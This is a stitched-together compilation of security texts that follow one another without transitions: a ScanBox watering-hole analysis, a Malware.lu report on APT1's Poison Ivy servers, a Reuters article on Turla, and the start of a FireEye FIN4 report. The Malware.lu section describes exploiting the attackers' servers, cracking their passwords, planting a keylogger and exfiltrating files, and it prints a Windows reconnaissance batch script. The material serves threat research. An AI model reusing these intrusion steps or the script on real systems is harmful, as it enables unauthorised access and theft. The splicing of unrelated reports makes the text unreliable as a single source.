Browsers the attackers are not interested in will be served the following placeholder instead of the malicious function : Figure 3 – The empty JavaScript function that the exploit kit delivers when a browser does n't match a targeted browser The following ScanBox plugins are deployed on code.googlecaches [ .
] com , dependent upon the users browser : Table 2 – A table of plugins loaded per browser on code.googlecaches [ .
] com .
There are further code differences too .
Take for example the different implementations of software enumeration , by identifying whether certain files exist : Figure 4 – Software enumeration on googlecaches [ .
] com ( left ) and foundationssl [ .
] com ( right ) From a developer 's perspective , I know it 's always a good idea to check the details of any exceptions that occur when writing code in order to create more stable applications .
It 's pleasing to see the ScanBox developers using good coding practices , though only if they 're in the office ! Figure 5 – Highlighted section of code from Figure 3 ( Plugin 1 on code.googlecaches [ .
] com ) When identifying the security software , only the implementation found on foundationssl [ .
] com employs the full version of some publicly available code [ 5 ] ( the section of code with informational messages such as `` '' Folder was found ! '' '' ) .
In all other versions only a subsection of the same code is used .
At this point we ' ve established that there are subtle variations between the ScanBox code deployed on different websites , however this could be due to differences in the expected environment of the targets the attackers wish to infect in each case , or upgrades to the framework .
Analysis of associated attacker infrastructure In order to potentially group the activity observed together , we analysed network infrastructure associated with the domains used by the attacker ( s ) deploying the ScanBox framework .
Our analysis showed that there was little overlap both in terms of associated infrastructure and in terms of the malware families associated with that infrastructure .
Summaries of each cluster are given below , whilst full details of the components which made up each are available in the Appendix .
We have been unable to identify any direct overlaps between the clusters , i.e .
shared domains or IP addresses , neither have we been able to determine any softer linkages beyond the reuse of the GoDaddy registrar .
Of course this could be due to lack of data points available to us – we welcome any additional data points the community are available to provide which show linkages between the clusters shown below .
Visualisations of each cluster can be seen in the Maltego graphs below : Cluster 1 Cluster 2 Cluster 3 Cluster 4 Conclusions In this post we ' ve identified four affected websites , each of which would draw distinct audiences who would be valuable to different actors .
We ' ve also taken a look at the variations in how the framework was implemented , and found a few subtle differences in the implementations .
Finally , we analysed the associated infrastructure with the attacker domains used in each case , and found no overlap between the clusters of activity .
In a similar fashion to our previous blog entry on potential overlap between APT1 and Putter Panda [ 6 ] , we can attempt to explain these differences with several hypotheses : 1 .
The framework is used by a single group that target widely and upgrade or adapt their code for different targets , and are careful to avoid any overlap in infrastructure or in services used .
2 .
Selections of actors share some resources , as per previous observations with similar kits by some security vendors [ 7 ] .
3 .
The exploit kits have been used by one group , and taken from public watering holes for their own use by other unrelated persons In our experience , very few attackers have the patience to maintain completely distinct infrastructure with multiple registrars , name servers and hosting providers at the same time , therefore we have a low confidence in hypothesis 1 .
In our view , the hypothesis with the highest probability is that groups of attackers share resources leading to overlaps – this appears to be an ever more common feature – with malware families , builders , and even sometimes hosting infrastructure being shared between disparate actors with a common goal .
Sharing frameworks like ScanBox or other exploit kits allows less sophisticated actors ( who were themselves unable to develop a tool like ScanBox ) to conduct better attacks .
Figure 1 : Attackers working hours ...
...
...
...
...
...
...
...
...
...
...
...
...
...
...
...
...
...
...
...
...
...
...
...
...
...
...
...
...
...
...
...
...
7 Figure 2 : Network schema ...
...
...
...
...
...
...
...
...
...
...
...
...
...
...
...
...
...
...
...
...
...
...
...
...
...
...
...
...
...
...
...
...
...
...
...
.
12 Figure 3 : Proxy server login window ...
...
...
...
...
...
...
...
...
...
...
...
...
...
...
...
...
...
...
...
...
...
...
...
...
...
...
...
...
...
...
.
13 Figure 4 : Poison Ivy interface with the list of connected machines ...
...
...
...
...
...
...
...
...
...
...
...
...
...
...
...
13 Figure 5 : Poison Ivy interface with a shell ...
...
...
...
...
...
...
...
...
...
...
...
...
...
...
...
...
...
...
...
...
...
...
...
...
...
...
...
..
14 Figure 6 : Example of network target diagram ...
...
...
...
...
...
...
...
...
...
...
...
...
...
...
...
...
...
...
...
...
...
...
...
...
...
..
17 Figure 7 : Terminator password ...
...
...
...
...
...
...
...
...
...
...
...
...
...
...
...
...
...
...
...
...
...
...
...
...
...
...
...
...
...
...
...
...
...
18 Figure 8 : Terminator CRC algorithm ...
...
...
...
...
...
...
...
...
...
...
...
...
...
...
...
...
...
...
...
...
...
...
...
...
...
...
...
...
...
...
.
19 Figure 9 : Terminator xor and compare operation on the password ...
...
...
...
...
...
...
...
...
...
...
...
...
...
...
...
19 Figure 10 : Terminator : starting interface ...
...
...
...
...
...
...
...
...
...
...
...
...
...
...
...
...
...
...
...
...
...
...
...
...
...
...
...
...
.
20 Figure 11 : Terminator : Protocol and port choice ...
...
...
...
...
...
...
...
...
...
...
...
...
...
...
...
...
...
...
...
...
...
...
...
...
.
20 Figure 12 : Terminator : List of infected machines ...
...
...
...
...
...
...
...
...
...
...
...
...
...
...
...
...
...
...
...
...
...
...
...
...
20 Figure 13 : Terminator : List of features ...
...
...
...
...
...
...
...
...
...
...
...
...
...
...
...
...
...
...
...
...
...
...
...
...
...
...
...
...
...
.
21 Figure 14 : Terminator : List of processes on the infected machine ...
...
...
...
...
...
...
...
...
...
...
...
...
...
...
...
.
22 Figure 15 : Terminator : List of opened ports on the infected machine ...
...
...
...
...
...
...
...
...
...
...
...
...
...
...
22 Figure 16 : Terminator : Remote shell on the infected machine ...
...
...
...
...
...
...
...
...
...
...
...
...
...
...
...
...
...
.
23 Figure 17 : Terminator : Registry access to the infected machine ...
...
...
...
...
...
...
...
...
...
...
...
...
...
...
...
...
.
23 Figure 18 : Terminator : Services management on the infected machine ...
...
...
...
...
...
...
...
...
...
...
...
...
.
24 Figure 19 : Terminator : Information about the infected machine ...
...
...
...
...
...
...
...
...
...
...
...
...
...
...
...
...
..
24 Figure 20 : Terminator : Installed software on the infected machine ...
...
...
...
...
...
...
...
...
...
...
...
...
...
...
...
25 1.1 Context The company Mandiant published in February 2013 a report about an Advance Persistent Threat ( APT ) called APT1 .
The report can be freely downloaded here : http : //intelreport.mandiant.com/ .
Inspired by this article , we have decided to perform our own technical analysis of this case .
In the report , Mandiant explains that the attackers were using a well - known Remote Administration Tool ( RAT ) called Poison Ivy and that they were located in China .
We based our investigation based on those two facts only .
1.2 Objectives The objective of the mission was to understand how these attackers work .
Our purpose was to identify their infrastructures , their methodologies and also the tools they used .
We are convinced that in order to protect our infrastructures against this kind of attacks , we need to analyse , learn and understand the way attackers work .
1.3 Authors This report has been created by Malware.lu CERT , the first private Computer Security Incident Response Team ( CSIRT ) located in Luxembourg and itrust consulting S.A.R.L , a Luxembourg based company specialising in formation system security .
We would like to thank the incident response teams who have collaborated with us .
Thanks for their help and for their support .
1.4 Ethical choices In this chapter is described our approach about the ethical choices made during this work .
First , we warned the national and/or private Computer Security Incident Response Teams ( CSIRT - CERT ) associated to the targets of the attackers .
Before publishing this report , we have waited for a reasonable time .
Finally , all the servers from which we collected data belonged to the attackers .
We do not attack or try to attack compromised machines .
1.5 Document structure This document is structured in the following way :  Chapter 2 deals with the information gathering phase ;  Chapter 3 describes the malware Poison Ivy and a vulnerability of it ;  Chapter 4 is a static analysis of samples ;  Chapter 5 deals with the information we gathered on the attacked command & control ;  Chapter 6 introduces an homemade RAT called terminator ; 2.1 Command & Control scanner In the Mandiant report , it is explained that the attacker used a well - known Remote Administration Tool ( RAT ) called Poison Ivy .
This RAT can be freely downloaded here : http : //www.poisonivy- rat.com/ .
This RAT will be discussed in the next chapter .
To identify the machines that were using this RAT , we have developed a Poison Ivy scanner .
Here is the code of this scanner : The scanner sends 100 times 0x00 to a specific port and IP .
If in the response the server sends back 100 other bytes followed by the specific data 0x000015D0 , we know that the running service is a Poison Ivy server .
We chose to scan the following ports :  3460 ( default Poison Ivy port )  80 ( HTTP port )  443 ( HTTPS port )  8080 ( alternate HTTP port ) .
We decided to scan a wide IP range located in Hong Kong .
2.2 IP ranges After removing false positives , we identified 6 IP ranges where Poison Ivy Command & Control servers were running : 2.3 Working hours We had some difficulties to identify the C & C servers because the attackers stopped the Poison Ivy daemon when they were not using it .
That explains why the scanner did not identify all the C & C servers at certain moments of the day .
However , using this parameter , we were able to identify their working hours .
Here is the average working hours for a week ( the hour on the graph is UTC+1 ) : Generally , the attackers worked between 2AM and 10AM from Monday to Saturday included .
3.1 Description Poison Ivy is a Remote Administration Tool ( RAT ) available here : http : //www.poisonivy- rat.com/index.php ? link = download .
This RAT is well documented on the Internet .
Here is a short list of the features it provides : 3.2 Remote code execution vulnerability An exploitable vulnerability has been discovered by Andrzej Dereszowski from SIGNAL 11 .
The description of the vulnerability can be found here : http : //www.signal11.eu / en / research / articles/ targeted_2010.pdf .
This vulnerability allows the remote execution of arbitrary code on the command & control server .
Metasploit framework provides an exploit to use this vulnerability .
The code is available here : http : //dev.metasploit.com / redmine / projects / framework / repository / entry/ modules / exploits / windows / misc / poisonivy_bof.rb .
This exploit did not work in our context .
The exploit has two possible exploitations : - by using the default password : admin - by using brute force As the two methods did not work ; we created a third one .
This method consists of finding the real password used for the encryption .
Our homemade exploit with an option for the password is available in Appendix .
For information , an additional Ruby package is needed to use the camellia cipher .
The package can be installed using the gem command : root @ alien : # gem install camellia - rb The next step was to find the password used to encrypt the communication .
3.3 Encryption key brute forcing The RAT uses a key to encrypt the communication .
The password is set by the administrator and its default value is `` admin '' .
After a quick search on the Internet , we know that Poison Ivy uses Camellia as encryption algorithm .
The encryption is made with 16 bytes blocks .
So we decided to choose the following approach : - Send 100 bytes ( with 0x00 ) to the daemon ( same than in our scanner ) - Get the first 16 bytes as result from the server Here is the formula of the result : Result = Camellia ( 16 * 0x00 , key ) The result is not a printable value .
Thus , we decided to make a base64 of this value and add the flag $ camellia $ to identify the algorithm .
Here is an example of result : $ camellia $ ItGoyeyQIvPjT / qBoDKQZg== To get the key , we developed a `` John the Ripper '' extension .
`` John the Ripper '' is an open source password cracker .
The source code can be downloaded here : http : //www.openwall.com / john/ .
OpenSSL provides the camellia algorithm .
The code source of the `` John the Ripper '' plugin to crack camellia hashes by using the OpenSSL library is available in the appendix .
After compiling `` John the Ripper '' , a new format is available : camellia .
Here is an example of a brute force session : rootbsd @ alien : ~/john-1.7.9-jumbo-7/run $ cat test.txt $ camellia $ ItGoyeyQIvPjT / qBoDKQZg== rootbsd @ alien : ~/john-1.7.9-jumbo-7/run $ ./john
-- format = camellia test.txt Loaded 1 password hash ( Camellia bruteforce [ 32/32 ] ) No password hashes left to crack ( see FAQ ) rootbsd @ alien : ~/john-1.7.9-jumbo-7/run $ ./john
-- show test.txt ? : pswpsw 1 password hash cracked , 0 left The key is `` pswpsw '' .
This key must be used in our homemade Metasploit exploit .
3.4 Exploitation With the information we previously described , we were able to get access to the attackers servers .
msf exploit ( poisonivy_bof_v2 ) > show options Module options ( exploit / windows / misc / poisonivy_bof_v2 ) : Payload options ( windows / meterpreter / reverse_https ) : Once connected to the Poison Ivy server , we noticed that the server had no public IP .
We attacked a server with the IP X.X.X.X ( identified during the scan ) and the meterpreter endpoint IP address was Y.Y.Y.Y .
We concluded that the Poison Ivy daemon was hidden behind a proxy server , by using port forwarding to hide the real IP of the command & control server .
We could also identify that the vendor ID of the MAC address is VMWare .
By listing the processes , we are able to validate this hypothesis : 3.5 Shellcode After a few days the attackers detected our presence on their systems , particularly because of the network connections between their Poison Ivy machines and our machines .
Using the netstat command they were able to detect our connection .
Basically , the Poison Ivy server only had connections originating from the proxy server and no connection from any other IP .
In order to stay stealth we had to connect to the Poison Ivy server through the proxy server .
To establish this connection we decided to create our own shellcode .
The principle of our shellcode is as follows : - Once injected in a process , the shellcode looks for open sockets ; - Once a opened socket is detected , this socket is closed ; - After , the shellcode binds itself on the previous open port ; - From now on , we are going to use the same technique than the one used in meterpreter ( bind_tcp ) .
Our shellcode goal is to close the Poison Ivy daemon 's socket and then open our own socket on the same port .
Once our socket is opened we can use the proxy chains provided by the attackers to connect to the Poison Ivy server .
In this case , when attackers checked the opened connections using netstat they could not identify our connection since it appeared to be originating from an infected target … The source code of the shellcode can be found in appendix .
4.1 Infrastructure schema Our investigation allowed us to draw a network schema of the attackers ' infrastructure .
Figure 2 : Network schema The infected machines communicate with the proxy through the Internet .
The proxy server will forward the network packets to the Poison Ivy server .
The proxy feature is done by an executable called xport.exe .
This executable can encode network traffic using a xor operation .
This feature requires having the executable running on both machines : the proxy and the Poison Ivy server .
The syntax on the proxy server is : xport.exe Proxy_ip proxy_port Poison_Ivy_ip Poison_Ivy_port number The argument number can either be set to 1 or 2 and represents the two different encoding keys .
The syntax on the Poison Ivy server is : xport.exe Poison_Ivy_ip Poison_Ivy_port localhost Poison_Ivy_daemon_port number The Poison Ivy server is managed by the attackers through a VMWare remote desktop , so that we were not able to get the real IP address of the attacker .
During our investigation , we identified an established Remote Desktop Protocol ( RDP ) connection between the Poison Ivy server and the proxy server .
We decided to install a key - logger on the Poison Ivy server that allowed us to see credentials to remotely connect to the proxy server .
Since the attackers use RDP to manage the proxy server and that we had access , we copied the Windows event logs .
Those logs contained all IPs which established a successful RDP authentication .
We identified more than 350 unique IPs : rootbsd @ alien : ~/APT1 $ cat list_ip.txt | sort –u | wc -l 384 We suppose that this list also contains Poison Ivy servers IPs and maybe IPs of attackers who inadvertently connect directly to the proxy ) .
Here is the screenshot of the proxy RDP authentication : Figure 3 : Proxy server login window Here is the screenshot of the Poison Ivy interface : Figure 4 : Poison Ivy interface with the list of connected machines Here is the screenshot of an attacker using a remote shell to an infected target : Figure 5 : Poison Ivy interface with a shell Using those accesses , we managed to exfiltrate a massive amount of files , event logs , netstat outputs … The interesting information can be divided in two categories : - Information about the tools used by the attackers ; - Information about the targets .
4.2 Tools The following table provides an overview on the discovered tools .
The RAT called Terminator will be described in the next chapter .
We found a batch script similar to the one described in Mandiant 's report : @ echo off echo % computername % > > c : \recycler\ % computername % _ base.dat qwinsta > > c : \recycler\ % computername % _ base.dat date /t > > c : \recycler\ % computername % _ base.dat time /t > > c : \recycler\ % computername % _ base.dat ipconfig /all > > c : \recycler\ % computername % _ base.dat nbtstat -n > > c : \recycler\ % computername % _ base.dat systeminfo > > c : \recycler\ % computername % _ base.dat set > > c : \recycler\ % computername % _ base.dat net share > > c : \recycler\ % computername % _ base.dat net start > > c : \recycler\ % computername % _ base.dat tasklist /v > > c : \recycler\ % computername % _ base.dat netstat -ano > > c : \recycler\ % computername % _ base.dat dir c : \ /a > > c : \recycler\ % computername % _ base.dat dir d : \ /a > > c : \recycler\ % computername % _ base.dat dir c : \progra~1 > > c : \recycler\ % computername % _ base.dat dir c : \docume~1 > > c : \recycler\ % computername % _ base.dat net view /domain > > c : \recycler\ % computername % _ base.dat dir /a /s c : \ > > c : \recycler\ % computername % _ filelist.dat dir /a /s d : \ > > c : \recycler\ % computername % _ filelist.dat del c : \recycler\base.bat The purpose of this batch script is to get information about an infected workstation .
In addition , we found a directory with the official SecureCrt , which is an SSH client .
We also found the SysInternals suite from Microsoft .
4.3 Targets The attackers seem to use a dedicated proxy and Poison Ivy server combination for each target .
When a target discovers the IP address of a proxy , this address is reassigned to another target .
That 's why it is primordial to share the C & C servers IPs with our partners .
The targets were private and public companies , political institutions , activists , associations or reporters .
On the Poison Ivy server , a directory is created for every target .
Within this directory , a directory for each infected machine was created .
The naming convention for those directories is HOSTNAME^USERNAME .
Here is an example : E : \companyABCD\alien^rootbsd\ In those directories files are not sorted in any specific manner .
The documents types are : - .PPT
- .XLS
- .DOC
- .PDF
- .JPG
Among those documents , we found : - Network diagrams ; - Internal IP / user / password combination ( local administrator , domain administrator , root , web , webcam … ) ; - Map of the building with digital code to open doors ; - Security incident listings ; - Security policies ; - … The sensitive documents were password protected .
The passwords pattern is [ a - z ] { 3,4 } [ 0 - 9 ] { 3,4 } , so it was easy to brute force them in reasonable time .
Here is an example of a network diagram .
Figure 6 : Example of network target diagram 5.1 Description On one of the proxy server , we identified a binary called Terminator3.6.exe .
After a quick analysis we noticed that this binary is the server side of a homemade Remote Administration Tool ( RAT ) .
After analysis , we identified that this sample corresponds to Fakem RAT discovered by Trendmicro in January 2013 .
Additional information can be found there : http : //www.trendmicro.com / cloud- content / us / pdfs / security - intelligence / white - papers / wp - fakem - rat.pdf .
We were lucky enough to find the client side ( the malware ) on the same server .
These two binaries allowed us to test the product and see how it works .
5.2 Password protection When the server is starting , a password is asked : Figure 7 : Terminator password We decided to crack this password .
A CRC is generated based on the supplied password .
Here is the algorithm of this CRC : Figure 8 : Terminator CRC algorithm After this operation , a xor , then a compare operation is done : Figure 9 : Terminator xor and compare operation on the password To obtain the password , we developed a brute forcer ; the code source is available in the appendix .
The first argument is the maximum number or characters and the second is the value used in the comparison ( available in the ASM code ) .
rootbsd @ alien : ~/terminator $ ./bf
10 0xdafd58f3 DEBUG : Ap @ hX dafd58f3 dafd58f3 In this case the password to start the server is `` Ap @ hX '' .
5.3 Features and usage The malware 's way to operate is simple and efficient since it does not embed any specific feature .
The malware waits for a library ( DLL ) sent from the command and control .
The attackers then choose a specific feature , and send the associated DLL file to the infected machine .
The libraries are stored in the server 's executable file as resources .
The resources are not encrypted but the libraries headers are removed .
The communication scheme is really weird , the infected machine ( the client ) sent HTML to the C & C .
The communication starts with : < html > < title > 12356 < /title > < body > This string can be identified in the memory of the process .
The pattern of the connection is : stage = `` < html > < title > 12356 < /title > < body > '' stage + = `` \xa0\xf4\xf6\xf6 '' stage + = `` \xf6 '' * ( 0x400 - len ( stage ) ) Here is the main RAT 's GUI : Figure 10 : Terminator : starting interface We can choose between three different protocols : Figure 11 : Terminator : Protocol and port choice When a machine is infected , it appears on the GUI : Figure 12 : Terminator : List of infected machines Below is the interface that is shown once a machine has been selected : Figure 13 : Terminator : List of features On the screenshot we can see the 10 available features .
Each one of the features matches a DLL file .
To upload a DLL to the infected machine ( and enable its feature ) , we have to tick the feature 's checkbox and then click on `` Upload Plug '' .
For example , if we choose `` Shell Plug - ins '' , the button '' Shell '' ( on the left pane ) becomes enabled .
Here is the list of available features : - File management ; - Process management ; - Shell access ; - Screenshot ; - Registry management ; - Services management ; - Get information of the infected machine ; - Keylogger ; - Dump password hashes in memory ; - View user 's files .
Here are some screenshots of the administration interface : Figure 14 : Terminator : List of processes on the infected machine Figure 15 : Terminator : List of opened ports on the infected machine Figure 16 : Terminator : Remote shell on the infected machine Figure 17 : Terminator : Registry access to the infected machine Figure 18 : Terminator : Services management on the infected machine Figure 19 : Terminator : Information about the infected machine Figure 20 : Terminator : Installed software on the infected machine 5.4 Scanner We decided to create a scanner to identify the servers which were running Terminator .
Here is the code to identify the service : With this script , we identified more C & C servers managed by the attackers , which allowed us to refine our scheme of the attacker 's infrastructure .
5.5 Remote code execution vulnerability After a full analysis of the communication protocol , we identified a vulnerability in the Command & Control executable : The server does not correctly parse the data sent by the infected machine .
We created an exploit to remotely take control of the command & control .
The code source of the Metasploit exploit is available in the appendix . The exploitation provided the following result .
Classification Public In this report , we document how we could reveal the methodology and tools used by an attacker .
The used technologies were commonly known , which supports our fears that such kind of APT affects more and more infrastructures .
Among them we can find public companies , governmental and political institutions … The most efficient and proactive way to protect an infrastructure and fight back the attackers is to understand their attacks and the way they work .
An interesting fact is to see the professionalization in this field .
Here are some key facts about the attackers : - More than 300 servers - Use of proxy servers to hide their activities ; - one server per target ; - custom made malware - working hours , such as office employees - really good organization - … Infrastructures such as the one detailed in this report are expensive but Intelligence is a real issue .
People or organisations seem do not hesitate to pay for such illegal information theft .
`` The only real defense is offensive defense '' ( Mao Zedong ) Ivy exploit # # # This file is part of the Metasploit Framework and may be subject to # redistribution and commercial restrictions .
Please see the Metasploit # web site for more information on licensing and terms of use .
# http : //metasploit.com/ # # Terminator ( aka Fakem RAT ) password brute forcer // gcc -o bf bf.c // ./bf
2:45pm EST By Peter Apps and Jim Finkle LONDON / BOSTON ( Reuters ) -­ A sophisticated piece of spyware has been quietly infecting hundreds of government computers across Europe and the United States in one of the most complex cyber espionage programs uncovered to date .
Several security researchers and Western intelligence officers say they believe the malware , widely known as Turla , is the work of the Russian government and linked to the same software used to launch a massive breach on the U.S. military uncovered in 2008 .
It was also linked to a previously known , massive global cyber spying operation dubbed Red October targeting diplomatic , military and nuclear research networks .
Those assessments were based on analysis of tactics employed by hackers , along with technical indicators and the victims they targeted .
`` It is sophisticated malware that 's linked to other Russian exploits , uses encryption and targets western governments .
It has Russian paw prints all over it , '' said Jim Lewis , a former U.S. foreign service officer , now senior fellow at the Center for Strategic and International Studies in Washington .
However , security experts caution that while the case for saying Turla looks Russian may be strong , it is impossible to confirm those suspicions unless Moscow claims responsibility .
Developers often use techniques to cloud their identity .
The threat surfaced this week after a little known German anti-­virus firm , G Data , published a report on the virus , which it called Uroburos , the name text in the code that may be a reference to the Greek symbol of a serpent eating its own tail .
Experts in state-­sponsored cyber attacks say that Russian government-­backed hackers are known for being highly disciplined , adept at hiding their tracks , extremely effective at maintaining control of infected networks and more selective in choosing targets than their Chinese counterparts .
`` They know that most people do n't have either the technical knowledge or the fortitude to win a battle with them .
When they recognize that someone is onto them , they just go dormant , '' said one expert who helps victims of state-­sponsored hacking .
A former Western intelligence official commented : '' They can draw on some very high grade programmers and engineers , including the many who work for organized criminal groups , but also function as privateers .
'' Russia 's Federal Security Bureau declined comment as did Pentagon and U.S. Department of Homeland Security officials .
On Friday , Britain 's BAE Systems Applied Intelligence -­ the cyber arm of Britain 's premier defense contractor -­ published its own research on the spyware , which it called '' snake .
'' The sheer sophistication of the software , it said , went well beyond that previously encountered -­ although it did not attribute blame for the attack .
`` The threat ...
really does raise the bar in terms of what potential targets , and the security community in general , have to do to keep ahead of cyber attacks , '' said Martin Sutherland , managing director of BAE Systems Applied Intelligence .
NATO NATIONS TARGETED Security firms have been monitoring Turla for several years .
Symantec Corp estimates up to 1,000 networks have been infected by Turla and a related virus , Agent . BTZ .
It named no victims , saying only that most were government computers .
BAE said it has collected over 100 unique samples of Turla since 2010 , including 32 from Ukraine , 11 from Lithuania and 4 from Great Britain .
It obtained smaller numbers from other countries .
Hackers use Turla to establish a hidden foothold in infected networks from which they can search other computers , store stolen information , then transmit data back to their servers .
`` While it seems to be Russian , there is no way to know for sure , '' said Mikko Hypponen , chief research officer with Helsinki-­ based F-­Secure , which encountered Turla last year .
Security firms that are monitoring the threat have said the operation 's sophistication suggests it was likely backed by a nation state and that technical indicators make them believe it is the work of Russian developers .
European governments have long welcomed U.S. help against Kremlin spying , but were infuriated last year to discover the scale of surveillance by America 's National Security Agency that stretched also to their own territory .
AGENT.BTZ , RED OCTOBER Security experts say stealthy Turla belongs to the same family as one of the most notorious pieces of spyware uncovered to date : Agent . BTZ .
It was used in a massive cyber espionage operation on U.S. Central Command that surfaced in 2008 and is one of the most serious U.S. breaches to date .
While Washington never formally attributed blame , several U.S. officials have told Reuters they believed it was the work of Russia .
Hypponen said Agent . BTZ was initially found in a military network of a European NATO state in 2008 , but gave no details .
F-­ Secure is credited with naming that piece of malware in 2008 , though researchers believe it was created already in 2006 .
Kaspersky Lab researcher Kurt Baumgartner said he believes Turla and Agent . BTZ are related to Red October , which suddenly shut down after his firm reported on it in January 2013 .
`` Unusually unique artifacts link Red October , Agent . BTZ and Turla , '' he said , referring to strings of text contained in the code and functionality of the malware .
Eric Chien , technical director with Symantec Security Response , described Turla as '' the evolution '' of Agent . BTZ .
`` They are a very active development group , '' Chien said .
Finland said its Foreign Ministry computer systems had been penetrated by an attack last year but would not elaborate .
Sweden 's National Defence Radio Establishment said cyber espionage was '' more common than people think '' , adding that it had discovered multiple attacks against authorities , governments and universities , some only detected after several years .
Government sources in the Czech Republic , Estonia , Poland and Romania said Turla had not affected them directly .
Other European governments contacted by Reuters declined comment .
CHASING TURLA Although computer security researchers have been quietly studying Turla for more than two years , public discussions of the threat only began after G Data published its report .
G Data spokesman Eddy Willems declined to name any victims or identify the author of the report , saying the firm was concerned the group behind Turla might attempt to harm him .
Jaime Blasco , director of AlienVault Labs , said that Turla was more of a '' framework '' for espionage than simply malware .
The malware is a '' root kit '' that hides the presence of the spying operation and also creates a hidden , encrypted file system to store stolen data and tools used by the attackers , he said .
Those tools include password stealers , tiny programs for gathering information about the system and document stealers .
The operators can download specialized tools onto an infected system , adding any functionality they want by including it in the encrypted file system , Blasco said .
They have used dozens of different '' command and control '' servers located in countries around the world to control infected systems , according to Symantec , whose researchers have helped identify and shut down some of those systems .
Researchers say Turla 's code is regularly updated , including changes to avoid detection as anti-­virus companies detect new strains .
BAE said it had two samples created in January 2014 .
Chien said that in some cases when a command and control server was taken offline , Turla 's operators have quickly pushed out new versions of the malware that directed infected computers to new command and control servers .
`` They have a super active development team , '' he said .
CONTENTS Acknowledgments to Jen Weedon , Laura Galante , Arif Khan F ireEye is currently tracking a group that targets the email accounts of individuals privy to the most confidential information of more than 100 companies .
The group , which we call FIN4 , appears to have a deep familiarity with business deals and corporate communications , and their effects on financial markets .
Operating since at least mid-2013 , FIN4 distinctly focuses on compromising the accounts of individuals who possess non - public information about merger and acquisition ( M & A ) deals and major market - moving announcements , particularly in the healthcare and pharmaceutical industries .
FIN4 has targeted individuals such as top executives , legal counsel , outside consultants , and researchers , among others .
We are able to characterize FIN4 's activity from the incidents to which we have responded in our clients ' networks , FIN4 's attempts to compromise our managed service clients , our product detection data , and further independent research .
Our visibility into FIN4 's activities is limited to their network operations ; we can only surmise how they may be using and potentially benefiting from the valuable information they are able to obtain .
However one fact remains clear : access to insider information that could make or break stock prices for dozens of publicly traded companies could surely put FIN4 at a considerable trading advantage .
F ireEye believes FIN4 intentionally targets individuals who have inside information about impending market catalysts - events that will cause the price of stocks to rise or fall substantially in a short period of time .
Since at least mid-2013 , FIN4 has pursued targets at more than 100 organizations , over two - thirds of which are public healthcare and pharmaceutical companies .
The remaining targets include advisory firms that represent public companies and a handful of public companies in other sectors closely followed by market watchers .
All but three of the public companies are listed on the NYSE or NASDAQ , with the remaining three listed on non - US exchanges .
In order to get useful inside information , FIN4 compromises the email accounts of individuals who regularly communicate about market- moving , non - public matters .
FIN4 frequently targets : • C - level executives and senior leadership • Legal counsel • Regulatory , risk , and compliance personnel • Researchers • Scientists • People in other advisory roles Figure 1 : FIN4 's Targets Figure 2 : Targeted healthcare and pharmaceutical industry sub - sectors M & A Deals in FIN4 's Crosshairs FIN4 focuses on acquiring information about ongoing M & A discussions and identifying the individuals who are most likely involved .
The group frequently employs M & A - themed and SEC - themed lures with Visual Basic for Applications ( VBA ) macros implemented to steal the usernames and passwords of these key individuals .
Additionally , FIN4 has included links to fake Outlook Web App ( OWA ) login pages designed to capture the user 's credentials .
Once equipped with the credentials , FIN4 then has access to real - time email communications - and presumably insight into potential deals and their timing .
Many of FIN4 's lures appeared to be stolen documents from actual deal discussions that the group then weaponized and sent to individuals directly involved in the deal .
In some cases , the discussions were public knowledge and widely reported in the media , while others were still in the early exploration and due diligence phases .
In one instance , we observed FIN4 simultaneously target five different organizations involved in a single acquisition discussion .
The group targeted individuals at the five firms several months before the organizations ' involvement in the acquisition talks went public .
Lasering in on Healthcare and Pharmaceuticals We believe FIN4 heavily targets healthcare and pharmaceutical companies as stocks in these industries can move dramatically in response to news of clinical trial results , regulatory decisions , or safety and legal issues .
In fact , many high - profile insider trading cases involve the pharmaceutical sector .
We ' ve observed FIN4 access information on a wide variety of issues - including drug development , insurance reimbursement rates , and pending legal cases - all of which can significantly influence the price of healthcare industry stocks .
In one case , FIN4 targeted employees involved in Medicaid rebates and government purchasing processes - these issues can heavily influence stock prices .
Healthcare and pharmaceutical companies depend heavily on the decisions of large third party payers ( like Medicaid ) whose purchasing power and rebate decisions can make or break a company 's earnings .
FIN4 would presumably use this information to evaluate healthcare companies ' future revenue .
FIN4 's campaign codes illustrate their interest in the organizations and job roles most likely to have access to market - moving information before it goes public .
Keeping it Organized FIN4 organizes the targets of their activity with over 70 unique `` campaign codes '' to designate the employer of the individuals they target , or in some cases the generic roles the targeted individuals play within that organization .
These campaign codes function as labels that FIN4 uses to identify the origin of usernames and passwords stolen from their targets .
These campaign codes are transmitted to FIN4 's command and control ( C2 ) servers along with stolen credentials .
For example : • CEO_CFO_COO_CORPDEV • SCIENTISTS_AND_RESEARCH • < PHARMACEUTICAL COMPANY NAME > • < ADVISORY FIRM NAME > Figure 3 : Example of FIN4 Campaign Code Figure 4 : FIN4 phishing email to an executive A fter identifying a target , FIN4 frequently embeds VBA macros into a previously stolen Office document .
The embedded macro displays a dialog box that mimics the Windows Authentication prompt for the user to enter their domain credentials .
These credentials are transmitted to a server controlled by the group , allowing FIN4 to hijack that user 's email account .
FIN4 also sends highly tailored emails that typically play on the recipient 's knowledge or interest in a pending deal .
In several instances , FIN4 has included links to fake OWA login pages in their phishing emails instead ( Figure 4 ) .
This would be useful for targeting organizations that may have disabled VBA macros in Microsoft Office .
FIN4 's Social Engineering FIN4 knows their audience .
Their spearphishing themes appear to be written by native English speakers familiar with both investment terminology and the inner workings of public companies .
FIN4 's phishing emails frequently play up shareholder and public disclosure concerns .
Figure 4 shows the group 's strong command of an executive 's concerns over illicit public disclosure , particularly over executive incompetence and compensation issues .
This email came from an account that FIN4 hijacked at a public company and includes several watchwords : `` disclosure '' of '' confidential company information regarding pending transactions .
'' These specific issues are key terms at public companies , where the public disclosure of sensitive business information is strictly regulated .
Figure 5 : Generic FIN4 Lure Document While a large share of FIN4 's lures are previously stolen confidential company documents , the group occasionally uses generic lures of interest to the investment community ( Figure 5 ) .
FIN4 also uses existing email threads in a victim 's inbox to spread their weaponized documents .
We ' ve seen the actors seamlessly inject themselves into email threads .
FIN4 's emails would be incredibly difficult to distinguish from a legitimate email sent from a previously compromised victim 's email account .
The actors have also Bcc 'd all recipients , making it even more difficult for recipients to decipher a malicious email from a legitimate one .
A Fly on Many Walls In several of our investigations , FIN4 targeted multiple parties involved in a business deal , including law firms , consultants , and public companies .
In one instance , FIN4 appeared to leverage its previously - acquired access to email accounts at an advisory firm ( `` Advisory Firm A '' ) to collect data during a potential acquisition of one of Advisory Firm A 's clients ( `` Public Company A '' ) .
